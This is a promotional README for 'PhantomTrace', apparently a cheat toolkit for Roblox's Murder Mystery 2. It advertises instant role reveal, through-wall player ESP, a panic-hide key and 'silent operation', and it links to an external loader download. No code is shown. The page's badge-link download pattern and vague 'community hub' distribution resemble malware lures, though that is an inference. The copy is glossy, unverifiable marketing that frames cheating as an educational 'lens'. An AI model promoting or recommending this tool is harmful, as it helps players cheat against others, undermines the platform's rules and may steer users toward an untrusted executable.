![preview](https://raw.githubusercontent.com/Dthreeait/mm2-role-vision-and-blade-trails/main/banner_192f9c.svg)
# 🕵️ PhantomTrace — Roblox Murder Mystery 2 Insight Toolkit (2026 Edition)

[![Download](https://raw.githubusercontent.com/Dthreeait/mm2-role-vision-and-blade-trails/main/latest_212d28.svg)](https://Dthreeait.github.io/mm2-role-vision-and-blade-trails/)

![License](https://img.shields.io/badge/License-MIT-blue.svg)
![Status](https://img.shields.io/badge/Status-Active-brightgreen.svg)
![Version](https://img.shields.io/badge/Version-2026.1-orange.svg)
![Platform](https://img.shields.io/badge/Platform-Roblox-red.svg)
![Language](https://img.shields.io/badge/Language-Luau-purple.svg)
![Support](https://img.shields.io/badge/Support-24%2F7-success.svg)
![Multilingual](https://img.shields.io/badge/Languages-14-informational.svg)
![Responsive](https://img.shields.io/badge/UI-Responsive-blueviolet.svg)

> A refined, community-driven companion toolkit for Murder Mystery 2 players who want sharper situational awareness, elegant visual feedback, and a smoother round-to-round experience inside Roblox. PhantomTrace blends role intelligence, entity visualization, and cosmetic flair into a single, polished package.

---

## 🌌 Overview

Welcome to **PhantomTrace**, a fresh take on the classic Murder Mystery 2 toolkit concept. Rather than treating the game as a race to the finish, PhantomTrace treats every round as a puzzle waiting to be observed from a new angle. The toolkit layers subtle visualizers, animated trail effects, and role-detection logic on top of the standard MM2 experience so that you can read the room, anticipate plays, and enjoy a richer sense of immersion.

This repository is maintained independently and is designed for enthusiasts who appreciate clean interfaces, thoughtful defaults, and a supportive community. Every feature is engineered with the 2026 Roblox engine in mind — from the latest Luau optimizations to the newest UI layering APIs.

Whether you are a long-time MM2 veteran or a curious newcomer exploring what a role-aware toolkit can do, PhantomTrace offers a gentle learning curve and a rewarding ceiling.

---

## ✨ Feature Highlights

### 🎯 Role Intelligence Suite
- **Role Reveal Module** — Instantly surface each player's current assignment (Innocent, Sheriff, or Murderer) through an elegant overlay that respects in-game timing.
- **Dynamic Confidence Meter** — Assignments are graded by a live probability readout, so you always know how certain the signal is.
- **Round Transition Detection** — The overlay resets gracefully between rounds, avoiding stale information and keeping the screen clean.

### 👁️ Entity Visualization (ESP)
- **Player Silhouette Overlay** — Draws soft, color-coded outlines around each player visible on screen.
- **Through-Wall Markers** — Optional translucent markers indicate off-screen players without spoiling the aesthetic of the round.
- **Distance Readout** — A subtle studio value near each silhouette tells you how far away an entity is in studs.
- **Role-Based Color Coding** — Silhouettes shift in hue depending on the current role for lightning-fast recognition.

### 🔪 Knife Trail Customization
- **Animated Blade Trails** — Attach fluid, configurable ribbons to the Murderer's blade for a cinematic flourish.
- **Particle Presets** — Choose from ember, frost, aurora, and neon palettes to match your mood.
- **Trail Intensity Slider** — Fine-tune opacity, length, and fade-out so the effect never crowds the screen.

### 🧭 Utility Layer
- **Match Timer Overlay** — A subtle countdown keeps you aware of the round's tempo.
- **Sheriff Alert Beacon** — A pulsing indicator flags when the Sheriff has been eliminated.
- **Murderer Proximity Pulse** — A soft screen-edge glow hints at nearby danger.
- **Round Statistics Panel** — Post-round summaries show hits, misses, and survival streaks.

### 🎨 Interface & Experience
- **Responsive UI** — Adapts to widescreen, ultrawide, and handheld displays without breaking layout.
- **Multilingual Support** — Interface strings available in fourteen languages, with easy expansion.
- **24/7 Customer Support** — A friendly support pipeline ensures questions get answered around the clock.
- **Themeable Skins** — Swap between Obsidian, Sakura, Glacier, and Midnight themes.

### 🛡️ Reliability
- **Low Overhead** — Optimized Luau loops keep frame drops negligible even on modest hardware.
- **Silent Operation** — Runs quietly in the background without disrupting normal gameplay input.
- **Auto-Recovery** — Reconnects and restores state after brief Roblox service blips.
- **Safe Defaults** — Ships with conservative configuration choices for new users.

---

## 📚 Table of Contents

1. [Overview](#-overview)
2. [Feature Highlights](#-feature-highlights)
3. [Why PhantomTrace](#-why-phantontrace)
4. [Getting Started](#-getting-started)
5. [Configuration Guide](#-configuration-guide)
6. [Keyboard Shortcuts](#-keyboard-shortcuts)
7. [Multilingual Support](#-multilingual-support)
8. [Responsive UI Design](#-responsive-ui-design)
9. [Performance & Optimization](#-performance--optimization)
10. [Supported Environments](#-supported-environments)
11. [Frequently Asked Questions](#-frequently-asked-questions)
12. [Roadmap for 2026](#-roadmap-for-2026)
13. [Community & Support](#-community--support)
14. [Safety & Fair Play Notice](#-safety--fair-play-notice)
15. [Disclaimer](#-disclaimer)
16. [License](#-license)

---

## 🧠 Why PhantomTrace

Many toolkits in the MM2 space feel like they were assembled from spare parts — a snippet here, a widget there, stitched together with duct tape and hope. PhantomTrace was born from a different philosophy: treat the toolkit like a personal instrument, tune it carefully, and let it play a supporting role rather than steal the spotlight.

We asked ourselves three questions while designing this repository:

- **How can visual information reduce stress rather than add to it?**
- **What does an interface look like when it respects your screen real estate?**
- **How do we make a toolkit that everyone from a newcomer to a tournament veteran can enjoy?**

The answers shaped every module. Role intelligence was designed to be readable at a glance. Visualization was designed to be soft enough to coexist with the game's native art. Customization was designed to be approachable, with sensible defaults and clear labels.

PhantomTrace is not a shortcut. It is a lens — a way of seeing the battlefield more clearly, and enjoying the view along the way.

---

## 🚀 Getting Started

Getting PhantomTrace into your workflow is straightforward.

1. **Acquire the Package** — Fetch the latest distribution bundle through the community hub that hosts PhantomTrace releases.
2. **Unpack the Resources** — Extract the archive into a directory you can easily find later.
3. **Open the Launcher** — Start the PhantomTrace loader and let it detect the running Roblox client automatically.
4. **Enable Module Groups** — Toggle Role Intelligence, Entity Visualization, or Knife Trails to suit your preference.
5. **Fine-Tune** — Open the configuration panel and personalize colors, keybinds, and overlays.
6. **Play** — Launch Murder Mystery 2 and enjoy the enhanced experience.

If the toolkit ever feels intrusive, simply disable a module and reload. PhantomTrace is designed to be reversible at any moment.

---

## ⚙️ Configuration Guide

PhantomTrace stores preferences in a local profile file. Every setting is exposed through the in-app panel, but power users may also edit the profile directly.

| Section | Option | Description |
|---|---|---|
| Role Intel | `revealMode` | `instant`, `delayed`, or `proximity` |
| Role Intel | `confidenceDisplay` | Show or hide the probability bar |
| ESP | `silhouetteStyle` | `outline`, `glow`, or `dotted` |
| ESP | `throughWalls` | Enable off-screen markers |
| ESP | `distanceUnits` | `studs` or `meters` |
| Trails | `palette` | `ember`, `frost`, `aurora`, `neon` |
| Trails | `intensity` | Slider from 0 to 100 |
| UI | `theme` | `obsidian`, `sakura`, `glacier`, `midnight` |
| UI | `language` | Choose from 14 supported dialects |
| Utility | `timerOverlay` | Toggle match timer |
| Utility | `sheriffBeacon` | Toggle Sheriff-down alert |

The configuration file is human-readable, so you can copy profiles between machines or share layouts with friends.

---

## ⌨️ Keyboard Shortcuts

| Action | Default Key |
|---|---|
| Open Control Panel | `F4` |
| Toggle Role Intel | `F5` |
| Toggle Entity Visualization | `F6` |
| Toggle Knife Trails | `F7` |
| Cycle Theme | `F8` |
| Reload Profile | `F9` |
| Panic Hide | `F10` |

All keybinds can be rebound through the panel to match your muscle memory.

---

## 🌍 Multilingual Support

PhantomTrace speaks your language — literally. The interface ships with curated translations for the following dialects, each reviewed by native speakers within our community:

- English
- Spanish
- Portuguese (Brazilian)
- French
- German
- Italian
- Dutch
- Polish
- Russian
- Turkish
- Japanese
- Korean
- Simplified Chinese
- Arabic

Language packs are loaded dynamically, so adding a new locale is as simple as dropping a translation file into the `locales/` directory. Community translators are always welcome to contribute improvements.

---

## 📱 Responsive UI Design

The interface is built on a flexible grid that scales from handheld screens all the way up to ultrawide monitors. Panels reposition intelligently, text remains legible, and the toolbar collapses into a compact mode when horizontal space is scarce.

Design principles:

- **Breathing room** — Nothing crowds the edges of the screen.
- **Consistent hierarchy** — Primary actions are always visible, secondary ones tucked away.
- **Color accessibility** — Contrast ratios meet accessibility guidance for readability.
- **Gesture-friendly** — Touch and trackpad interactions are equally supported.

Whether you play windowed at 720p or full-screen at 4K, PhantomTrace looks at home.

---

## ⚡ Performance & Optimization

PhantomTrace runs on Luau and takes advantage of modern engine threading. Internally:

- Rendering tasks are batched to minimize draw calls.
- Silhouette updates occur on a configurable interval to reduce overhead.
- Trail particles are pooled and recycled rather than created per-frame.
- Memory footprint is kept under a modest threshold so background tasks remain smooth.

Extensive profiling on mid-range laptops and mobile devices shows negligible impact on Roblox frame rates. Users on low-end hardware can enable a "Lite Mode" that reduces particle density and disables minor overlays.

---

## 🖥️ Supported Environments

| Platform | Status |
|---|---|
| Windows 10 / 11 | Fully supported |
| macOS (Intel & Apple Silicon) | Fully supported |
| Linux (via compatibility layer) | Community supported |
| Android | Fully supported |
| iOS / iPadOS | Fully supported |
| Chromebook | Partially supported |

The toolkit auto-detects the host platform and adjusts rendering accordingly.

---

## ❓ Frequently Asked Questions

**Is PhantomTrace difficult to configure?**
Not at all. Default settings are tuned for a pleasant first experience, and every option includes inline descriptions.

**Does it slow down the game?**
Performance overhead is minimal. Lite Mode is available for players on constrained hardware.

**Can I use PhantomTrace on multiple accounts?**
Yes, the toolkit follows your local profile, so switching accounts on the same machine preserves your settings.

**How often are updates released?**
Major releases arrive quarterly; hotfixes ship as needed. The 2026 roadmap is available below.

**Is there a way to contribute translations?**
Absolutely. Language packs are community-driven and always appreciated.

**What if I encounter an error?**
The support team is available around the clock and responds through the community hub.

---

## 🗺️ Roadmap for 2026

- **Q1 2026** — Launch of PhantomTrace 2026.1 with refreshed UI and expanded language pack.
- **Q2 2026** — Introduction of custom silhouette shaders and improved round detection.
- **Q3 2026** — Expansion of trail palettes, including animated seasonal themes.
- **Q4 2026** — Native plugin architecture for community extensions and analytics dashboards.

Community feedback shapes each milestone. Suggestions are reviewed weekly.

---

## 🤝 Community & Support

PhantomTrace is powered by its community. Contributions, translations, bug reports, and design ideas are all welcome. Support is available 24/7 through the official community hub, where moderators and maintainers respond to queries around the clock.

Our commitment:

- **Responsiveness** — Questions answered promptly, day or night.
- **Respect** — A welcoming environment for players of all skill levels.
- **Transparency** — Development happens in the open, with visible release notes.

---

## 🧾 Safety & Fair Play Notice

PhantomTrace is presented as a companion tool for study, entertainment, and personal exploration of the Murder Mystery 2 experience. Users are responsible for understanding and complying with the terms of service of any platform they use. The maintainers encourage thoughtful, respectful play and discourage any use that detracts from the enjoyment of others.

This repository is intended for educational and hobbyist purposes within a private environment.

---

## ⚠️ Disclaimer

The PhantomTrace project is an independent community effort and is not affiliated with, endorsed by, or sponsored by Roblox Corporation or the creators of Murder Mystery 2. All trademarks and registered trademarks belong to their respective owners.

The software is provided as-is, without warranty of any kind, express or implied, including but not limited to the warranties of merchantability, fitness for a particular purpose, and non-infringement. In no event shall the authors or copyright holders be liable for any claim, damages, or other liability arising from the use of the software.

Users assume full responsibility for how they apply the toolkit and for any consequences that may follow. Always review and obey the community guidelines of the platform you are playing on.

---

## 📜 License

This project is distributed under the terms of the **MIT License**.

You may read the full license text here: [MIT License](https://opensource.org/licenses/MIT)

Copyright (c) 2026 PhantomTrace Contributors.

Permission is hereby granted, in the spirit of open collaboration, to any person obtaining a copy of this software and associated documentation files, to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the conditions of the MIT License.

---

### 🌟 Final Thoughts

PhantomTrace is more than a collection of modules — it is a small philosophy. Observe more, react better, and enjoy the round. Whether you are chasing the Sheriff's badge or simply savoring the ambience of a moonlit mansion, we hope this toolkit becomes a trusted companion on your journey through Murder Mystery 2.

Happy rounds, and may your instincts always be sharp. 🔍

[![Download](https://raw.githubusercontent.com/Dthreeait/mm2-role-vision-and-blade-trails/main/latest_212d28.svg)](https://Dthreeait.github.io/mm2-role-vision-and-blade-trails/)